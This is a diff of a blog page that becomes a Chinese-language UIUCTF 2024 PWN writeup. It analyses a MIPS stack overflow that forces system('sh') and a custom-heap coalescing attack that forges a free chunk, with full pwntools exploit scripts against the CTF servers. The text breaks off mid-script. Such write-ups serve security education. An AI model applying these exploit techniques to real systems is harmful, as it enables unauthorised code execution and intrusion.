@@ -5,8 +5,8 @@
   <meta name="Volantis" content="6.0.0-alpha.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="https://blog.beacox.space/tags/美化/"/>
+  
+  <link rel="canonical" href="https://blog.beacox.space/posts/uiuctf-2024-wp/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://static.beacox.space'>
@@ -47,19 +47,21 @@
   <!-- feed -->
       <link rel="alternate" href="/atom.xml" title="BeaCox" type="application/atom+xml">
   <!-- 页面元数据 -->
-  <title>标签：美化 - BeaCox</title>
-  <meta name="keywords" content="黑客 信息安全 web安全 内容安全 系统安全 Linux 博客">
-  <meta desc name="description" content="技术与生活分享 - BeaCox - BeaCox">
+  <title>UIUCTF 2024 PWN Writeup - BeaCox</title>
+  <meta name="keywords" content="PWN,黑客 信息安全 web安全 内容安全 系统安全 Linux 博客">
+  <meta desc name="description" content="UIUCTF 2024 PWN 题全集（With L3ak）。 - BeaCox - BeaCox">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="BeaCox">
-<meta property="og:url" content="https://blog.beacox.space/tags/%E7%BE%8E%E5%8C%96/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UIUCTF 2024 PWN Writeup">
+<meta property="og:url" content="https://blog.beacox.space/posts/uiuctf-2024-wp/index.html">
 <meta property="og:site_name" content="BeaCox">
-<meta property="og:description" content="技术与生活分享">
+<meta property="og:description" content="UIUCTF 2024 PWN 题全集（With L3ak）。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog.beacox.space/img/android-icon-72x72.png">
+<meta property="article:published_time" content="2024-07-07T11:30:00.000Z">
+<meta property="article:modified_time" content="2024-07-07T11:30:00.000Z">
 <meta property="article:author" content="BeaCox">
-<meta property="article:tag" content="黑客 信息安全 web安全 内容安全 系统安全 Linux 博客">
+<meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://blog.beacox.space/img/android-icon-72x72.png">
   <style>
@@ -2250,7 +2252,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2899,25 +2901,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-
 <div id="l_main" class=''>
-  
-    
-      
-  <section class="post-list">
-    
-      
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="https://blog.beacox.space/posts/shell-customize/">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="https://blog.beacox.space/posts/uiuctf-2024-wp/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="BeaCox">
   </span>
@@ -2926,64 +2912,527 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="技术与生活分享">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://blog.beacox.space/img/android-icon-72x72.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/posts/shell-customize/"  itemprop="url">
-        终端自定义——StarShip
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
     
-      <p>一个好看且好用的终端<del>或许</del>是生产力的保障。之前折腾终端的时候也试了很多方法，比如换成zsh、fish等，还有实适用于bash的OhMySH项目（不是zsh）……其实都挺不错的，但是有一个问题——速度比不加任何插件的bash慢一些。机缘巧合下，发现了StarShip项目，速度显然更快，因此撰写此文分享、记录。Ubuntu + bash用户可以完全参照此文。</p>
+    
+      <h1 class="title" itemprop="name headline">
+        UIUCTF 2024 PWN Writeup
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="/img/avatar.png" class="lazyload" data-srcset="/img/avatar.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">BeaCox</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  
+  
+  
+  <div class='new-meta-item category'>
+    <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/CTF/">CTF</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/CTF/" itemprop="url"><span itemprop="name">CTF</span></a>
+      </span>
     
   </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2023-07-29T19:04:50+08:00">2023-07-29</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E8%BD%AF%E4%BB%B6/">软件</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E8%BD%AF%E4%BB%B6/" itemprop="url"><span itemprop="name">软件</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/posts/shell-customize/' itemprop="url">
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
 
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateModified" datetime="2024-07-07T19:30:00+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2024年7月7日</p>
+  </a>
 </div>
 
+          
+        
+          
+            
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：4.7k 字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：23 分钟</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+             
+  <div class="new-meta-item comments-count"> 
+     
+    <a href="/posts/uiuctf-2024-wp/#comments"> 
+      <i class="fa-duotone fa-comment-dots fa-fw"></i> 
+      <p> 
+        <span data-page-key="/posts/uiuctf-2024-wp/" id="ArtalkCount"> 
+          <i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i>
+        </span> 
+         
+          <span class="leancloud-comments-count">&nbsp;条评论</span> 
+         
+      </p>       
+    </a> 
+  </div> 
+ 
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <p>我和 <a target="_blank" rel="noopener" href="https://x.com/l3akctf">L3ak</a> 一起参加了今年的 <a target="_blank" rel="noopener" href="https://2024.uiuc.tf/">UIUCTF</a>，最终我们排在第7。我只做了 Pwn 题，我们队最终也 AK 了 Pwn，<a target="_blank" rel="noopener" href="https://x.com/minatotw_">MinatoTW</a> is goat🐐! </p>
+<p>本文是比赛中所有 Pwn 题（除了一道 Pwn+Rev 以外）的 Writeup。</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/BeaCox/693563583377a778ba5b5fc98387b2d4">Engllish Writeup</a></p>
+<h2 id="Backup-Power"><a href="#Backup-Power" class="headerlink" title="Backup Power"></a>Backup Power</h2><h3 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h3><blockquote>
+<p>Can you turn on the backup generator for the SIGPwny Transit Authority?</p>
+<p>75 solves</p>
+</blockquote>
+<p>这道题是 MinatoTW 解出来的，我只是在赛后复现并撰写 wp。</p>
+<p><code>checksec</code> 结果：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     mips-32-big</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX unknown - GNU_STACK missing</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">Stack:    Executable</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这是一道 mips 架构的栈溢出题。我用<code>qemu-mips</code>去运行，用<code>gdb-multiarch</code>调试。</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序的主要逻辑是：</p>
+<ul>
+<li><p>非<code>developer</code>（<code>developer</code>?<code>develper</code>?<code>devolper</code>? 一个程序出现三种拼写 XD）用户只被允许执行<code>shutdown</code>和<code>shutup</code>命令，没有可利用之处。</p>
+</li>
+<li><p>登录为<code>developer</code>用户，<code>command</code>会被设置为<code>todo</code>。调用<code>develper_power_management_portal()</code>函数后回到对命令进行判断的流程。其中，<code>develper_power_management_portal()</code>函数中调用<code>gets()</code>函数，存在栈溢出。</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">develper_power_management_portal</span><span class="params">(<span class="type">int</span> cfi)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">4</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> vars20; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">  <span class="keyword">if</span> ( vars20 != cfi )</span><br><span class="line">    _stack_chk_fail_local();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>如果<code>command</code>为<code>system</code>，则程序会拼接栈上变量作为<code>system()</code>函数的参数并执行：</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, system_str) )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">sprintf</span>(command_buf, <span class="string">"%s %s %s %s"</span>, arg1, arg2, arg3, arg4);</span><br><span class="line">  system(command_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>在调用<code>develper_power_management_portal()</code>函数前后，程序试图通过寄存器来备份栈上变量的值：</p>
+<p><img src="https://bu.dusays.com/2024/07/06/6689647325ffb.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/06/6689647325ffb.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="backup"></p>
+<p>但是在<code>develper_power_management_portal()</code>函数中，程序又在调用<code>gets()</code>函数之后将寄存器的值设置为栈上的值：</p>
+<p><img src="https://bu.dusays.com/2024/07/06/6689648a4c273.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/06/6689648a4c273.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ruin"></p>
+<p>因此没有起到备份的效果，我们仍然可以通过栈溢出到<code>0x24+var_sC($sp), 0x24+var_s10($sp), ...</code>来设置<code>s4, s5, s6, s7</code>从而设置<code>arg1, arg2, arg3, arg4</code>。</p>
+</li>
+</ul>
+<p>至此，我们的解题路线可以归纳为：利用栈溢出设置<code>command</code>为<code>system</code>，并设置<code>arg1</code>为<code>sh;\x00</code>，使得程序执行<code>system("sh")</code>。值得注意的是程序开启了<code>cfi</code>校验，即在<code>develper_power_management_portal()</code>函数返回时，会检查其返回地址有没有被修改。在这题中我们不需要劫持控制流，因此将返回地址保持原状即可。</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>使用 <code>qemu-mips</code>启动程序并等待<code>gdb</code>远程调试：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mips -g 1234 ./backup-power</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在另一个终端中启动<code>gdb-multiarch</code>并远程调试：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./backup-power</span><br><span class="line"></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> <span class="built_in">arch</span> mips</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian big</span><br><span class="line">pwndbg&gt; target remote :1234</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以通过 gdb 调试来定位我们需要修改的变量在栈上的位置：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x400ee8</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></tbody></table></figure>
+
+<p>输入用户名<code>devolper</code>，再输入<code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa</code>让<code>gets()</code>接收，就可以看到：</p>
+<p><img src="https://bu.dusays.com/2024/07/03/66856156f10e3.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/03/66856156f10e3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="args"></p>
+<p><img src="https://bu.dusays.com/2024/07/03/6685632ac71c6.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/03/6685632ac71c6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="stack"></p>
+<p>将<code>command</code>覆盖为<code>system</code>，<code>arg1</code>覆盖为<code>sh;\x00</code>，栈上包含程序地址处尽量保持原样即可。</p>
+<p>值得注意的两个地方：</p>
+<ol>
+<li>返回地址：上图中第二个<code>0x400b0c</code>。由于开启<code>cfi</code>，返回地址必须保持原样。</li>
+<li><code>gp</code>寄存器：上图中<code>0x4aa30</code>会被存入<code>gp</code>寄存器，之后会用于计算函数偏移量，因此不能修改。</li>
+</ol>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./backup-power"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">"backup-power.chal.uiuc.tf"</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">b"Username: "</span>, <span class="string">b'devolper'</span>)</span><br><span class="line">    payload = <span class="string">b"A"</span> * <span class="number">24</span> + <span class="string">b"sh;\x00"</span>.ljust(<span class="number">12</span>, <span class="string">b"A"</span>) + p32(<span class="number">0xdeadbeef</span>) * <span class="number">2</span> + p32(<span class="number">0x400b0c</span>)</span><br><span class="line"></span><br><span class="line">    sp = (</span><br><span class="line">        p32(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">        + p32(<span class="number">0x004AA330</span>)                       <span class="comment"># that's gp, we need to keep it</span></span><br><span class="line">        + p32(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">        + <span class="string">b"devolper"</span>.ljust(<span class="number">100</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">        + <span class="string">b"devolper"</span>.ljust(<span class="number">100</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">        + <span class="string">b"system\x00"</span>                         <span class="comment"># overwrite command to system</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    payload += sp</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>
+
+
+<h2 id="pwnymalloc"><a href="#pwnymalloc" class="headerlink" title="pwnymalloc"></a>pwnymalloc</h2><h3 id="概况-1"><a href="#概况-1" class="headerlink" title="概况"></a>概况</h3><blockquote>
+<p>i’m tired of hearing all your complaints. pwnymalloc never complains.</p>
+<p>65 Solves</p>
+</blockquote>
+<p>这道题是赛中和队友共同解出来的。</p>
+<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这是一道堆题，但是堆管理器是自定义的。</p>
+<p>程序的基本功能为：</p>
+<ol>
+<li>提交申诉（申请可用大小为0x48的堆块，输入内容，堆块内容被清零，堆块被释放）</li>
+<li>查看申诉（摆设，没有实际实现）</li>
+<li>申请退款（申请可用大小为0x88的堆块，用于存放<code>refund_request</code>结构体，不能被直接<code>free</code></li>
+<li>查询退款状态（状态为<code>REFUND_APPROVED</code>时会打印 flag ）</li>
+</ol>
+<p><code>refund_request</code>结构体的定义如下：</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">refund_request</span> {</span></span><br><span class="line">    <span class="type">refund_status_t</span> status;</span><br><span class="line">    <span class="type">int</span> amount;</span><br><span class="line">    <span class="type">char</span> reason[<span class="number">0x80</span>];</span><br><span class="line">} <span class="type">refund_request_t</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>申请退款函数会将<code>status</code>设置为0即<code>REFUND_DENIED</code>，另一个状态是1即<code>REFUND_APPROVED</code>，<code>amount</code>和<code>reason</code>都由用户输入。没有任何常规功能能直接将结构体的<code>status</code>设置为<code>REFUND_APPROVED</code>，因此需要考虑利用自定义的堆管理器来完成对该字段的修改。</p>
+<p>由于堆块需要0x10字节对齐，因此堆块的结构可能存在下面两种情况：</p>
+<p><img src="https://bu.dusays.com/2024/07/04/6686a5e8e217a.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/04/6686a5e8e217a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="chunk"></p>
+<p>当堆块可用大小为0x…8字节时，用户可用写到<code>btag</code>所在的8字节。正常情况下只有被<code>free</code>的堆块才会设置<code>btag</code>，这也是问题所在: 题目中的堆块可用大小都是0x…8字节，而在这种情况下，用户可以控制<code>btag</code>的值。</p>
+<p>堆管理器中空闲块合并的代码对我来说比较有趣（根据<code>unsorted bin</code>的经验）。简单来说，在<code>free</code>一个堆块或者拆分一个大的堆块时，会调用<code>coalesce()</code>合并空闲块；该函数会检查前一个和后一个堆块的大小、状态来决定是否合并。</p>
+<p>以合并前向块为例，有如下调用链</p>
+<p><code>coalesce()-&gt;prev_chunk()-&gt;get_prev_size()</code>，<code>get_prev_size()</code>函数实现如下：</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">get_prev_size</span><span class="params">(chunk_ptr block)</span> {</span><br><span class="line">    <span class="type">btag_t</span> *prev_footer = (<span class="type">btag_t</span> *) ((<span class="type">char</span> *) block - BTAG_SIZE);</span><br><span class="line">    <span class="keyword">return</span> prev_footer-&gt;size;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其中<code>btag</code>如前文所示位于每个堆块的最后8字节，堆管理器通过该值判断前向空闲堆块的大小。如果前向堆块未被<code>free</code>，正常情况下<code>get_prev_size</code>应当返回0。但如果我们将<code>btag</code>值设置为某一个正数，堆管理器会根据这个值去定位前向堆块的<code>size | status</code>，进一步判断其是否被<code>free</code>。通过构造 payload，我们完全可以修改某个堆块的<code>btag</code>，并在目标<code>size | status</code>处填充恰当的值，诱导堆管理器对前向的某一片连续的内存空间进行合并，不论这片内存空间处于什么样的使用状态。</p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>梳理一下我们的攻击思路：</p>
+<ol>
+<li><p>通过申请退款功能申请2个堆块（大小都为0x90）</p>
+</li>
+<li><p>将第二个堆块作为目标（其退款状态会被改写）</p>
+</li>
+<li><p>在第二个堆块的最后8字节写一个比0x90大的<code>size</code>作为<code>btag</code>（如0xb0）</p>
+</li>
+<li><p>在第一个堆块中间相应的位置（<code>chunk2_addr + 0x90 - 0xb0</code>）写上对应的<code>size | status</code>（如<code>0xb0 | 0</code>，表示被free）<br>此时堆块状态：</p>
+<p><img src="https://bu.dusays.com/2024/07/04/6686af09c9dc0.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/04/6686af09c9dc0.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1"></p>
+</li>
+<li><p>提交申诉，触发空闲块合并，会合并出一个大小为<code>0xb0+0x50</code>的空闲堆块，起始地址为<code>chunk2_addr + 0x90 - 0xb0</code></p>
+<p><img src="https://bu.dusays.com/2024/07/04/6686b251a012a.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/04/6686b251a012a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2"></p>
+</li>
+<li><p>再调用申请退款函数，此时申请到的堆块起始地址为<code>chunk2_addr + 0x90 - 0xb0</code>，大小为0x90</p>
+</li>
+<li><p>这个堆块横跨第一个堆块和第二个堆块，填充合适的<code>payload</code>可以将第二个堆块中的<code>refund_request-&gt;status</code>写为1即<code>REFUND_APPROVED</code></p>
+<p><img src="https://bu.dusays.com/2024/07/04/6686b34c90134.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/07/04/6686b34c90134.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="3"></p>
+</li>
+<li><p>调用检查退款状态函数，获得 flag</p>
+</li>
+</ol>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>我们伪造了一个大小为0xb0的空闲堆块，要注意在合并空闲块时会调用<code>free_list_remove(prev_block)</code>，因此要让该假堆块的<code>next</code>和<code>prev</code>指针为0（或合法地址），否则会出现内存访问的错误。</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">"./chal"</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">"pwnymalloc.chal.uiuc.tf"</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complain</span>(<span class="params">data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"1"</span>)</span><br><span class="line">    r.sendafter(<span class="string">b":"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">refund</span>(<span class="params">data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"refunded:\n"</span>, <span class="string">b"0"</span>) <span class="comment"># why would i refund XD</span></span><br><span class="line">    r.sendafter(<span class="string">b"request:\n"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">win</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b"&gt; "</span>, <span class="string">b"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b"ID:\n"</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    conn()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk inside</span></span><br><span class="line">    payload = <span class="string">b'\x00'</span>*<span class="number">0x60</span> + p64(<span class="number">0xb0</span>) +p64(<span class="number">0</span>)+p64(<span class="number">0</span>) + <span class="string">b'\n'</span></span><br><span class="line">    refund(payload)</span><br><span class="line">    <span class="comment"># the target chunk we will overflow</span></span><br><span class="line">    payload = <span class="string">b'\x00'</span>*<span class="number">0x78</span> + p64(<span class="number">0xb0</span>)[:-<span class="number">1</span>]</span><br><span class="line">    refund(payload)</span><br><span class="line">    <span class="comment"># trigger the coalesce</span></span><br><span class="line">    payload = <span class="string">b'BeaCox never complains\n'</span></span><br><span class="line">    complain(payload)</span><br><span class="line">    <span class="comment"># overwrite the target to make it approved</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0xdeadbeef</span>) + <span class="string">b'\n'</span> <span class="comment"># what about refunding a deadbeef?</span></span><br><span class="line">    refund(payload)</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    <span class="comment"># win!</span></span><br><span class="line">    win(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 